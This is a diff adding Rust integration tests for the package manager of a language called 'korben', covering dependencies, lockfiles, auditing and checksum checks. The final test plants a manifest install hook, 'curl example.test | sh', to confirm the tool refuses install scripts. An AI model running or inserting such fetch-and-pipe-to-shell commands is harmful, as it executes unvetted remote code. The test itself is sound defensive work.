@@ -393,3 +393,232 @@ fn calling_a_foreign_function_without_unsafe_is_rejected() {
     assert!(text.contains("unsafe-call"), "{text}");
     assert!(text.contains("wrap this in `(unsafe ...)`"), "{text}");
 }
+
+/// Build a small library package next to a project.
+fn write_library(root: &Path, name: &str, version: &str, body: &str) {
+    std::fs::create_dir_all(root.join("src")).unwrap();
+    std::fs::write(
+        root.join("korben.toml"),
+        format!(
+            "[package]\nname = \"{name}\"\nversion = \"{version}\"\nlicense = \"MIT\"\ndescription = \"test\"\nmain = \"{name}\"\n"
+        ),
+    )
+    .unwrap();
+    std::fs::write(root.join(format!("src/{name}.kb")), body).unwrap();
+}
+
+#[test]
+fn a_path_dependency_is_added_locked_and_used() {
+    let scratch = Scratch::new("deps");
+    write_library(
+        &scratch.path().join("shout"),
+        "shout",
+        "0.1.0",
+        "(module shout)\n\n;;; Add emphasis.\n(pub fn shout [text: String] -> String (format \"{text}!\"))\n",
+    );
+    assert!(korben(scratch.path(), &["new", "app"]).status.success());
+    let project = scratch.path().join("app");
+    std::fs::remove_file(project.join("tests/main_test.kb")).unwrap();
+    std::fs::write(
+        project.join("src/main.kb"),
+        "(module main\n  (use shout [shout]))\n\n(pub fn main [] -> Unit !io (println (shout \"hello\")))\n",
+    )
+    .unwrap();
+
+    // Without the declaration the module is not visible.
+    let before = korben(&project, &["check"]);
+    assert!(!before.status.success());
+    assert!(combined(&before).contains("cannot find module `shout`"), "{}", combined(&before));
+
+    let added = korben(&project, &["add", "shout", "--path", "../shout"]);
+    assert!(added.status.success(), "{}", combined(&added));
+    assert!(stdout(&added).contains("shout 0.1.0"), "{}", stdout(&added));
+
+    let lock = std::fs::read_to_string(project.join("korben.lock")).unwrap();
+    assert!(lock.contains("[package.shout]"), "{lock}");
+    assert!(lock.contains("source = \"path+../shout\""), "{lock}");
+    assert!(lock.contains("checksum = \"sha256:"), "{lock}");
+
+    let run = korben(&project, &["run"]);
+    assert!(run.status.success(), "{}", combined(&run));
+    assert_eq!(stdout(&run), "hello!\n");
+}
+
+#[test]
+fn a_build_reproduces_from_the_lockfile_and_notices_a_change() {
+    let scratch = Scratch::new("repro");
+    let library = scratch.path().join("shout");
+    write_library(
+        &library,
+        "shout",
+        "0.1.0",
+        "(module shout)\n\n;;; Add emphasis.\n(pub fn shout [text: String] -> String (format \"{text}!\"))\n",
+    );
+    assert!(korben(scratch.path(), &["new", "app"]).status.success());
+    let project = scratch.path().join("app");
+    std::fs::remove_file(project.join("tests/main_test.kb")).unwrap();
+    std::fs::write(
+        project.join("src/main.kb"),
+        "(module main\n  (use shout [shout]))\n\n(pub fn main [] -> Unit !io (println (shout \"hi\")))\n",
+    )
+    .unwrap();
+    assert!(korben(&project, &["add", "shout", "--path", "../shout"]).status.success());
+
+    let locked = std::fs::read_to_string(project.join("korben.lock")).unwrap();
+    assert!(korben(&project, &["run"]).status.success());
+    // Reproducing does not rewrite the lock.
+    assert_eq!(std::fs::read_to_string(project.join("korben.lock")).unwrap(), locked);
+
+    // A dependency that changed underneath the lock is an error, not a silent
+    // difference. This is acceptance criterion 10.
+    std::fs::write(
+        library.join("src/shout.kb"),
+        "(module shout)\n\n;;; Add emphasis.\n(pub fn shout [text: String] -> String (format \"{text}?\"))\n",
+    )
+    .unwrap();
+    let changed = korben(&project, &["run"]);
+    assert!(!changed.status.success());
+    let text = combined(&changed);
+    assert!(text.contains("has changed since it was locked"), "{text}");
+    assert!(text.contains("korben update"), "{text}");
+
+    // Accepting the change re-pins it.
+    let updated = korben(&project, &["update"]);
+    assert!(updated.status.success(), "{}", combined(&updated));
+    assert_ne!(std::fs::read_to_string(project.join("korben.lock")).unwrap(), locked);
+    let after = korben(&project, &["run"]);
+    assert!(after.status.success(), "{}", combined(&after));
+    assert_eq!(stdout(&after), "hi?\n");
+}
+
+#[test]
+fn a_transitive_dependency_must_be_declared_to_be_imported() {
+    let scratch = Scratch::new("transitive");
+    let registry = scratch.path().join("registry");
+    write_library(
+        &registry.join("text/0.1.0"),
+        "text",
+        "0.1.0",
+        "(module text)\n\n;;; Add emphasis.\n(pub fn shout [text: String] -> String (format \"{text}!\"))\n",
+    );
+    std::fs::create_dir_all(registry.join("greet/0.1.0/src")).unwrap();
+    std::fs::write(
+        registry.join("greet/0.1.0/korben.toml"),
+        "[package]\nname = \"greet\"\nversion = \"0.1.0\"\nlicense = \"MIT\"\nmain = \"greet\"\n\n[dependencies]\ntext = \"^0.1\"\n",
+    )
+    .unwrap();
+    std::fs::write(
+        registry.join("greet/0.1.0/src/greet.kb"),
+        "(module greet\n  (use text [shout]))\n\n;;; Greet loudly.\n(pub fn greet [name: String] -> String (shout name))\n",
+    )
+    .unwrap();
+
+    assert!(korben(scratch.path(), &["new", "app"]).status.success());
+    let project = scratch.path().join("app");
+    std::fs::remove_file(project.join("tests/main_test.kb")).unwrap();
+    std::fs::write(
+        project.join("src/main.kb"),
+        "(module main\n  (use greet [greet])\n  (use text [shout]))\n\n(pub fn main [] -> Unit !io (println (greet \"a\")) (println (shout \"b\")))\n",
+    )
+    .unwrap();
+
+    let added = Command::new(EXE)
+        .args(["add", "greet", "--version", "^0.1"])
+        .current_dir(&project)
+        .env("NO_COLOR", "1")
+        .env("KORBEN_REGISTRY", &registry)
+        .output()
+        .expect("add");
+    assert!(added.status.success(), "{}", combined(&added));
+
+    let check = Command::new(EXE)
+        .arg("check")
+        .current_dir(&project)
+        .env("NO_COLOR", "1")
+        .env("KORBEN_REGISTRY", &registry)
+        .output()
+        .expect("check");
+    assert!(!check.status.success());
+    let text = combined(&check);
+    assert!(text.contains("does not declare a dependency on `text`"), "{text}");
+    assert!(text.contains("korben add text"), "{text}");
+}
+
+#[test]
+fn audit_verifies_the_lockfile_and_reports_weakened_settings() {
+    let scratch = Scratch::new("audit");
+    write_library(
+        &scratch.path().join("shout"),
+        "shout",
+        "0.1.0",
+        "(module shout)\n\n;;; Add emphasis.\n(pub fn shout [t: String] -> String (format \"{t}!\"))\n",
+    );
+    assert!(korben(scratch.path(), &["new", "app"]).status.success());
+    let project = scratch.path().join("app");
+    std::fs::remove_file(project.join("tests/main_test.kb")).unwrap();
+    std::fs::write(
+        project.join("src/main.kb"),
+        "(module main\n  (use shout [shout]))\n\n(pub fn main [] -> Unit !io (println (shout \"x\")))\n",
+    )
+    .unwrap();
+    assert!(korben(&project, &["add", "shout", "--path", "../shout"]).status.success());
+
+    let audit = korben(&project, &["audit"]);
+    assert!(audit.status.success(), "{}", combined(&audit));
+    let text = stdout(&audit);
+    assert!(text.contains("ok shout 0.1.0"), "{text}");
+    assert!(text.contains("install scripts are prohibited"), "{text}");
+    assert!(text.contains("checksums are verified"), "{text}");
+    assert!(text.contains("not portable"), "a path dependency is worth flagging: {text}");
+
+    // A weakened verification setting is reported, per specification 21.3.
+    let weakened = Command::new(EXE)
+        .arg("audit")
+        .current_dir(&project)
+        .env("NO_COLOR", "1")
+        .env("KORBEN_SKIP_CHECKSUMS", "1")
+        .output()
+        .expect("audit");
+    let text = stdout(&weakened);
+    assert!(text.contains("KORBEN_SKIP_CHECKSUMS is set"), "{text}");
+    assert!(text.contains("checksum verification is disabled"), "{text}");
+}
+
+#[test]
+fn remove_drops_a_dependency() {
+    let scratch = Scratch::new("remove");
+    write_library(
+        &scratch.path().join("shout"),
+        "shout",
+        "0.1.0",
+        "(module shout)\n\n;;; Add emphasis.\n(pub fn shout [t: String] -> String t)\n",
+    );
+    assert!(korben(scratch.path(), &["new", "app"]).status.success());
+    let project = scratch.path().join("app");
+    assert!(korben(&project, &["add", "shout", "--path", "../shout"]).status.success());
+    assert!(std::fs::read_to_string(project.join("korben.toml")).unwrap().contains("shout"));
+
+    let removed = korben(&project, &["remove", "shout"]);
+    assert!(removed.status.success(), "{}", combined(&removed));
+    let manifest = std::fs::read_to_string(project.join("korben.toml")).unwrap();
+    assert!(!manifest.contains("shout"), "{manifest}");
+}
+
+#[test]
+fn a_manifest_declaring_an_install_script_is_refused() {
+    let scratch = Scratch::new("install");
+    assert!(korben(scratch.path(), &["new", "app"]).status.success());
+    let project = scratch.path().join("app");
+    let manifest = std::fs::read_to_string(project.join("korben.toml")).unwrap();
+    std::fs::write(
+        project.join("korben.toml"),
+        manifest.replace("[package]", "[package]\ninstall = \"curl example.test | sh\""),
+    )
+    .unwrap();
+
+    let check = korben(&project, &["check"]);
+    assert!(!check.status.success());
+    let text = combined(&check);
+    assert!(text.contains("would run code at install time"), "{text}");
+    assert!(text.contains("21.3"), "{text}");
+}
